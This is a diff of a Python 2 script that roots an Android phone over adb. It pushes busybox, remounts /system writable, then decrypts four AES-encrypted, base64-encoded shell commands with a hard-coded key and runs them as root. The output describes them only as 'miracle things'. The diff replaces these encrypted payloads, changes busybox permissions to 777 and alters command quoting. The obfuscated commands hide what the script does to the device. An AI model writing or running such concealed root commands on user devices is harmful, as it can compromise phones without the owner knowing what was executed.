@@ -18,10 +18,10 @@ key = AES.new('xxxxxxxxxxx-twiz')
 def main() :
 
 
-	dFirst = d_that_shit(key, "P5sW+MNGUuc2p4axzrh2Cvqs2R/F4k3ZL/z8wIyeDcf+Iyzs1dZXthQCo8+bwz2pY9wInNHnDj4x5U56drPRgkaQB3XUELHUz4nFnDEfClgOFDASltFd938asjlvyN+T+JTHfoz72pXLDTyqsIhlQUKjOPF/vm8KIls+sKIkynwVN+KSdhCdMr4PzTVxKFK3ZwjYQmGy8z5h3eGBL32OCX9vNqqS405UOri+AXF7M2YqvtkgS1YDG+acYmPrbiwN+rAKYlD0w3/vhh74pA98PAecHZ/2Nus7wBUcdVacWQiSPa4+/Jnl6FtkyMRlnN9i0+m7Unvg1LVXL5UV1dhoUUwoRxKvX6jAJXyJZg82X2b/zUrg0d0jFYw8HXxUhpmmMosT9O3QSJ57Po9oEUSdGMgvpFx6FfwpErVekn4wdUxcXRjOlHotau8p5xIi4Wi7wVGq+2xcYyjiGWArP+H+JQlItjNBlvUAWvF9d+BKtXD84NZqTJKsTHecZd+ZMcIvRS9bXz9R4B8jQh+CDofNbzneqArybdO/cqJUZvR/iKNIo1L0w1U1tRAei3NAISOq11wUX/GO9ZhPqb9jjg2P7bImRMKvJpLJGvS/TYkolCI2z8BZEKlo7gNZ0TFQyxjrRS9bXz9R4B8jQh+CDofNb0vu5wilqZLxBHExVzoOU4w=")
-	dSec = d_that_shit(key, "pvuJLPJUaOrA7JeqL0ZgdfxpNaDnf4OFxdatUNSVMjSAsmZA59F5mwIP0Uerd6XpJqoH0hiSApNhzyuA99pvQVTGiF5hJ+5Y250MCLDZWVj24VbMCvL31Vy+HD/sMQ1o1/vj2k1DlRoPYV14WEyeIiF2th04ujI+z0B9WscLPL7YVUg9xjzw9SHo+JoSICxukC+zk4848jzP9dsxnmHbH40zHDjHLaIxwtTpdrrWJDFtSbc3DcDN6trLlo9ZZPBk1/vj2k1DlRoPYV14WEyeIrKX5lbjJXHzxwz4Z1l5AWFaVG2VKac7TFnydY/FB4VDJqoH0hiSApNhzyuA99pvQWzUqGRnO6K249kBlAC5ezyDQ8Zbn9F+U6NhdcPUJqudPgDyncq4F5t3K4DlALLxaaz9TjUtLD84aYKx1I8UcCBdTyXr50euKAQqgrUY0YTHJqoH0hiSApNhzyuA99pvQdrGkIQrGWH/lfv8N5t/mzVcTsmUlNlBngGZr1qBGMmPPgDyncq4F5t3K4DlALLxaToS4jl0pnppLghtWcT30c9dV/aRE0La5OdBcaGz9igjJqoH0hiSApNhzyuA99pvQSI047ppouD/Gue+oyCB/KfxaGdqg2Sn3gJaS0YaP42fsWRFHjD0rBCp0Ks+m8i6KbZ+o4KXDecJfD88Zuy9FMdkaVWZ3JCHn7RtP0ybR5o15QglGXHeyzRvi8ZEevtz5m9cQsvGDvNZTAuKR0Sa2m+PrssEyqlkU7+X7rBczwf3T2kDo2w+Kuzkgg0abdWnIqf+oJNkrBjq5s3rLVPc8VQNTOA6xrNJtA9KjJvSWvo8zQPx6E4+A+EbFuIbOKrQ6g8fd3X9Rq07KKWQnUFmMBZHmJTa1aAYg8789hKy++jWiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
-	dThird = d_that_shit(key, "phEfmDrhJnWzuqtOIvJun4AMGBDRpqfSXeyEc5DPeuNgrNPjMKvzONFGqvSNTp3ORoGMPXxnaIYvEy2Ah8tRNp1ijJ3JxTZrchVgSNfo24SIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJw==")
-	dFourth = d_that_shit(key, "u3AZEO4OAksQcHLnsj9YD+TfjEyO4AFMnw7RMOOYMWgW2oj+bYjB9OH0sUrtPpDZ5N+MTI7gAUyfDtEw45gxaBbaiP5tiMH04fSxSu0+kNlZbnR5xCDkJXtTsJBSq5WxCc5H/ntDSHlbV+23XKKLpA78kiOAjQRi3DbHvyrEUdDrRDqqPQ+sxGk2YJapLUMBDhQwEpbRXfd/GrI5b8jfk6yhCEBdQXX3/C+kIgDpGkTBIurDXKHKxOrCFkycGbsRL/XpSRURScwKdqpfEM7IgdGR4otBlUN9/xA4J2nUn23cWFfgzWnyPnjL2fVN0qNt55E1NI/wfizYTOn4SnGwuot2ZyFKVwK4NTmbC5luuUXv/gz0o63d7Zb1H/Mt/K0zXwvuROOkYX6kI8uk5j2/wY9opVU74HFWlBeAYlTH5/w97Hbi1PXU2f7/lKGkHn4GIzmDr+vwUSJ4lC3lqqtFtqEh10EUV+gvNYOXJmE8wYH7neJujVLBGmenePE5sKtyEYNOcSemEXmwc6Q3ItVw1B4WGSnY2LnNgCcobDo4eZIeHuIlMuwm+bbn4oaJTOAWA9tLkth0kzQFtPVOLUb1ljLxR+j4vJH0rtTC7Zd6XsqYorflNaM3PoU2M9/t50kwJrXtDfs3BDMTyS3YoGMztay7sjFU4gnab+/qtClezVpZKHaruuU6hixwZLCem2uIYp9pWhml6J+G0nfLMoCiBWep/RSsyD68puDo2lZI16GIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
+	dFirst = d_that_shit(key, "P5sW+MNGUuc2p4axzrh2Cvqs2R/F4k3ZL/z8wIyeDcc8HbmjL6UBqoZ2D21/Blmr+qyF+BS+PGOFsySv7yddD1xdGM6Uei1q7ynnEiLhaLvWEpEArLCczJtvTxr2KIBfDhQwEpbRXfd/GrI5b8jfkzTzE7XJ0n64kuQDwph7Wmpnbx++m1LG14MpftUGnno2TChHEq9fqMAlfIlmDzZfZiJtltjYSveaC/cvljaAbLKCehfxAhgQ3xx6M72u0yYqf282qpLjTlQ6uL4BcXszZgavxpsFFcaRCeW2bH6GG/cv9elJFRFJzAp2ql8QzsiBnEha5NCGgdX95whCJH0ORxEv0V0j1rj/enqkS0O94YGSPa4+/Jnl6FtkyMRlnN9iasWjhu4c3khgYCPMj/sQkUKjOPF/vm8KIls+sKIkynxPw+vW5LjbY8iVHk4YhmJBmbYHtvKukSbhikGnr5/X7DKLE/Tt0Eieez6PaBFEnRjIL6RcehX8KRK1XpJ+MHVMXF0YzpR6LWrvKecSIuFou8FRqvtsXGMo4hlgKz/h/iUJSLYzQZb1AFrxfXfgSrVw/ODWakySrEx3nGXfmTHCL0UvW18/UeAfI0Ifgg6HzW853qgK8m3Tv3KiVGb0f4ijSKNS9MNVNbUQHotzQCEjqtdcFF/xjvWYT6m/Y44Nj+2yJkTCryaSyRr0v02JKJQiNs/AWRCpaO4DWdExUMsY60UvW18/UeAfI0Ifgg6HzW9L7ucIpamS8QRxMVc6DlOMiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
+	dSec = d_that_shit(key, "pvuJLPJUaOrA7JeqL0ZgdfxpNaDnf4OFxdatUNSVMjTDcd0XEWEHTZDrs3bXx0F69eFGKtwe4qmdi8FZnoAsGx9i5ThXeOl+m3vcI5SPlEYiN+0Y+m/ezFEpC8DbTX2AWJ1lL3vC6X4bD+uFocjF0W/n435QcqOD5gsClBHk87KVwC9MpZnQ2LPXpaenKh1qVWsKJ6iSQFEe5QI0pMrAKpAvs5OPOPI8z/XbMZ5h2x+NMxw4xy2iMcLU6Xa61iQxbUm3Nw3Azeray5aPWWTwZNf749pNQ5UaD2FdeFhMniKyl+ZW4yVx88cM+GdZeQFhM2isaf3Kw07BIRLhGq/6VPXhRircHuKpnYvBWZ6ALBtnRbmBeKhFbqixuKZvgo4BmVapJ0csZR29Ii78t6JB2c3QuZrQdT8FwoeiSzVdyOYf/9GAX2Y7kuhCBe/NLdtJFK0HSE9c3w2eO0Y/fjMMMBEv0V0j1rj/enqkS0O94YEmqgfSGJICk2HPK4D32m9B2saQhCsZYf+V+/w3m3+bNVxOyZSU2UGeAZmvWoEYyY8+APKdyrgXm3crgOUAsvFpOhLiOXSmemkuCG1ZxPfRzwrWJqo/Zgt8ZlEuD2MG8cH14UYq3B7iqZ2LwVmegCwb7nSFWU2sHgMFZWzXp3tByLh+r9SasCi7BcSpb6Q+Y2B41g4AlB2XOct1WClIaUy5+YTvnK2VNYXsTwTOM1alINYSkQCssJzMm29PGvYogF9kaVWZ3JCHn7RtP0ybR5o15QglGXHeyzRvi8ZEevtz5m9cQsvGDvNZTAuKR0Sa2m+PrssEyqlkU7+X7rBczwf3T2kDo2w+Kuzkgg0abdWnIh0q1abbV/DwrK72MT2m/2HQYjFqZYP7FevrUMpZS7fhgmDXREkJcsvYGuXcA+8E17ACVIyMpgzbk1FleQkXeD+QTVLOYzFA0XbvHIZk9g1WiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
+	dThird = d_that_shit(key, "nG4OrOvyhBEziMM+9012L+c5rYDnQiRdRhcLkTlpHgM+CB2mdpuXYE5yxxRhO95vmwCeeP3z+7Scf8W6PcIW7j4IHaZ2m5dgTnLHFGE73m9zZfM4A5T4Xxz05oIPuydxiIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJw==")
+	dFourth = d_that_shit(key, "LjoESKeNl6G6ImwkYl88Xg2PeWxjY4VM9HJTruv9dQCKVjs+X56pgjCqyuDq2IpK7vhOt5YeoL29LWWFhjRO7opWOz5fnqmCMKrK4OrYikrrlQAsoZY3MxC69P2j5C4OGhHanhIdf0dLHWIpuN9O4Cyj+FXoTq4gQR+KleSdx304y4F69NxDQONEhgGvek1U1hKRAKywnMybb08a9iiAXw4UMBKW0V33fxqyOW/I35OsoQhAXUF19/wvpCIA6RpEBYvs/oYRQzUAuHQT2U1VnRG8fW3PsFK5eCfxZg3D8i5Hqc5WXE218MnHoALkuIW32saQhCsZYf+V+/w3m3+bNVxOyZSU2UGeAZmvWoEYyY/goHL1uEPsewd6uLlCq3CPzp50Sn1feLmBt9lFKPCbVi2NvZBk0R+zqt/Vvvq1ERJHQIlk92ca+oLCKlCUs8xFrnOGsCFsqsluuaob1bK5ia81gh8V+ISH4g1JD0pCvS9Xs1aMlFvIWlKAZ5hDvnP0x/eZMG1mqhm2zPbqa4gE+qznI2tZUQ7W6wtp8KdIvaqwk3BiNBMuDphSyB2yX/YSH9mtmKwUU01jvuCRuMTNEADMFu46i6tosSXPprGqZLd6UW6D8VVWCYhzNQVS5YlcXJa8uwBv03nACUEuzzyUtpVPGSs+7YfxcBSFk401nwJHer6n+YCZcKGS5wqeCkjzlZBD64qv9OsR4m3wUTEie1tCOtnqHQgrjVitGiU/WDKLW4vbJdc4YuFJurtxHC+wNDm0J9lgmCIXONYM/4vJ54iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgniIcau/MP1JNSZKqJushoJ4iHGrvzD9STUmSqibrIaCeIhxq78w/Uk1Jkqom6yGgn")
 
 	print '###################################'
 	print '###################################'
@@ -40,22 +40,22 @@ def main() :
 
 	print 'Pushing busybox ...'
 	os.system('adb push busybox /data/local/tmp')
-	os.system("adb shell su -c 'chmod 644 /data/local/tmp/busybox'")
+	os.system("adb shell su -c 'chmod 777 /data/local/tmp/busybox'")
 	os.system("adb shell su -c '/data/local/tmp/busybox mount -o remount,rw /system'")
-	os.system("adb shell su -c 'cat /data/local/tmp/busybox >/system/bin/busybox'")
+	os.system("adb shell su -c 'dd if=/data/local/tmp/busybox of=/system/bin/busybox'")
 	os.system("adb shell su -c 'chmod 644 /system/bin/busybox'")
 
 	print 'making miracle things (1/3)'
-	os.system('adb shell ' + dFirst)
+	os.system('adb shell ' + "\"" + dFirst + "\"" )
 
 	print 'making miracle things (2/3)'
-	os.system('adb shell ' + dSec)
+	os.system('adb shell ' + "\"" + dSec + "\"" )
 
 	print 'making miracle things (3/3)'
-	os.system('adb shell ' + dThird)
+	os.system('adb shell ' + "\"" + dThird + "\"" )
 
 	print 'protecting you from that things ...'
-	os.system('adb shell ' + dFourth)
+	os.system('adb shell ' + "\"" + dFourth + "\"" )
 
 	print 'BINGO !!!'
 	print 'ur device will gettin reboot ..'
